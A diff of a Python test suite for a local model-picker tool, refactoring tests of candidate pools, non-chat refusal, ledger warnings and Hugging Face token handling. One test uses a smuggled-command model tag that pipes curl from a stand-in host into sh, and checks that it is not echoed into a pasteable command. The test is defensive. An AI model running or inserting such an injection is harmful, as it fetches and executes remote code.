@@ -28,6 +28,8 @@ import test_hf_search  # noqa: E402  (module imports only, so their tests are no
 import test_pick_badges  # noqa: E402
 import test_probe  # noqa: E402
 import test_run  # noqa: E402
+from agl.app import pick  # noqa: E402
+from agl.ui import banner, pick_menu  # noqa: E402
 
 T0 = 1_800_000_000.0
 URL = "https://huggingface.co/api/models?x=1"
@@ -585,7 +587,7 @@ class Probe(unittest.TestCase):
         def spy(*a, **k):
             made.append(real(*a, **k))
             return made[-1]
-        with mock.patch.object(probe.tempfile, "mkdtemp", side_effect=spy):
+        with mock.patch.object(tempfile, "mkdtemp", side_effect=spy):
             res, _ = self.never_raises(lambda i, r: _write_call("output.md", "A" * 5_000_000) if i == 0 else test_probe.say("x"))
         self.assertEqual(res["verdict"], "fail")
         self.assertTrue(made and not os.path.exists(made[0]))
@@ -601,7 +603,7 @@ class Probe(unittest.TestCase):
             for path in hostile:
                 with self.subTest(path=path):
                     os.makedirs(folder, exist_ok=True)
-                    with mock.patch.object(probe.tempfile, "mkdtemp", return_value=folder):
+                    with mock.patch.object(tempfile, "mkdtemp", return_value=folder):
                         res, _ = self.never_raises(lambda i, r, p=path: _write_call(p) if i == 0 else test_probe.say("x"))
                     self.assertEqual(res["verdict"], "fail", res)
                     for root, _dirs, files in os.walk(outer):
@@ -747,38 +749,38 @@ class RunGlue(test_pick_badges.PickBase):
     def test_two_different_namespaces_with_the_same_short_name_are_both_candidates(self):
         det = test_pick_badges.details(test_pick_badges.d("qwen3:8b", ["completion", "tools"]),
                                        test_pick_badges.d("acme/qwen3:8b", ["embedding"]))
-        pool = run._installed_candidates(["qwen3:8b", "acme/qwen3:8b"], det, HW, [])
+        pool = pick._installed_candidates(["qwen3:8b", "acme/qwen3:8b"], det, HW, [], ports=run.build_ports())
         self.assertEqual(sorted(c["tag"] for c in pool), ["acme/qwen3:8b", "qwen3:8b"])
 
     def test_refuse_non_chat_does_not_refuse_because_another_namespace_shares_the_short_name(self):
         pool = [self.cand("acme/foo:1", kind="embedding")]
-        self.assertIsNone(run._find_candidate("foo:1", pool))
+        self.assertIsNone(pick._find_candidate("foo:1", pool))
         with contextlib.redirect_stdout(io.StringIO()):
-            self.assertFalse(run._refuse_non_chat("foo:1", pool))
+            self.assertFalse(pick_menu.refuse_non_chat("foo:1", pool))
 
     def test_refuse_non_chat_with_a_name_that_is_not_in_the_pool_or_empty(self):
         with contextlib.redirect_stdout(io.StringIO()):
-            self.assertFalse(run._refuse_non_chat("nope:1", []))
-            self.assertFalse(run._refuse_non_chat("", [self.cand("a:1")]))
+            self.assertFalse(pick_menu.refuse_non_chat("nope:1", []))
+            self.assertFalse(pick_menu.refuse_non_chat("", [self.cand("a:1")]))
 
     def test_refuse_non_chat_is_case_insensitive(self):
         pool = [self.cand("Nomic-Embed:latest", kind="embedding")]
         with contextlib.redirect_stdout(io.StringIO()):
-            self.assertTrue(run._refuse_non_chat("nomic-embed", pool))
+            self.assertTrue(pick_menu.refuse_non_chat("nomic-embed", pool))
 
     def test_a_failed_chat_model_is_never_refused_only_warned(self):
         pool = [self.cand("m:1", ledger="fail")]
         out = io.StringIO()
         with contextlib.redirect_stdout(out):
-            self.assertFalse(run._refuse_non_chat("m:1", pool))
-            run._ledger_warning("m:1", [test_pick_badges.ledger_entry("m:1", "fail")])
+            self.assertFalse(pick_menu.refuse_non_chat("m:1", pool))
+            pick_menu.ledger_warning("m:1", [test_pick_badges.ledger_entry("m:1", "fail")])
         self.assertIn("failed a tool-call probe", out.getvalue())
 
     def test_the_ledger_warning_does_not_print_a_pasteable_injection(self):
         evil = "m:1; curl evil.example | sh"
         out = io.StringIO()
         with contextlib.redirect_stdout(out):
-            run._ledger_warning(evil, [test_pick_badges.ledger_entry(evil, "fail")])
+            pick_menu.ledger_warning(evil, [test_pick_badges.ledger_entry(evil, "fail")])
         for line in out.getvalue().splitlines():
             if "python run.py --probe" in line:
                 self.assertNotIn("; curl", line.split("--probe", 1)[1], "the tag is printed raw into a copy-paste command")
@@ -803,8 +805,8 @@ class RunGlue(test_pick_badges.PickBase):
         out = io.StringIO()
         with tempfile.TemporaryDirectory() as home, mock.patch.dict(os.environ, {"ANTIGRAVITY_LOCAL_HOME": home, "HF_TOKEN": secret}), \
                 mock.patch.object(urllib.request, "urlopen", opener), contextlib.redirect_stdout(out):
-            run._WARNED.clear()
-            rows = run.hf_menu_search("coder")
+            pick_menu._WARNED.clear()
+            rows = pick.hf_menu_search("coder", ports=run.build_ports(), out=banner.out)
             for p in Path(home).rglob("*"):
                 if p.is_file():
                     self.assertNotIn(secret, p.read_text(errors="replace"))
@@ -814,23 +816,23 @@ class RunGlue(test_pick_badges.PickBase):
 
     def test_a_blank_hf_token_is_sent_as_no_token(self):
         seen = []
-        with mock.patch.object(run.hf_search, "fetch_json", side_effect=lambda url, **kw: seen.append(kw.get("token")) or ([], "net")):
+        with mock.patch.object(hf_search, "fetch_json", side_effect=lambda url, **kw: seen.append(kw.get("token")) or ([], "net")):
             for v in ("", "   "):
                 with mock.patch.dict(os.environ, {"HF_TOKEN": v}):
-                    run.hf_menu_search("x")
+                    pick.hf_menu_search("x", ports=run.build_ports(), out=banner.out)
         self.assertEqual(seen, [None, None])
 
     def test_the_library_rows_are_capped(self):
         rows = [{"name": f"m{i}", "badges": ("tools",), "sizes": ("7b",), "note": "x"} for i in range(500)]
-        with mock.patch.object(run.ollama_library, "scan", return_value=rows):
-            self.assertLessEqual(len(run.get_library_rows(True)), 25)
+        with mock.patch.object(ollama_library, "scan", return_value=rows):
+            self.assertLessEqual(len(pick.get_library_rows(True, ports=run.build_ports(), out=banner.out)), 25)
 
     def test_an_unreadable_library_page_warns_once_and_gives_no_rows(self):
-        run._WARNED.clear()
+        pick_menu._WARNED.clear()
         out = io.StringIO()
-        with mock.patch.object(run.ollama_library, "scan", return_value=[]), contextlib.redirect_stdout(out):
-            self.assertEqual(run.get_library_rows(True), [])
-            run.get_library_rows(True)
+        with mock.patch.object(ollama_library, "scan", return_value=[]), contextlib.redirect_stdout(out):
+            self.assertEqual(pick.get_library_rows(True, ports=run.build_ports(), out=banner.out), [])
+            pick.get_library_rows(True, ports=run.build_ports(), out=banner.out)
         self.assertEqual(out.getvalue().count("Could not read the Ollama library page"), 1)
 
 
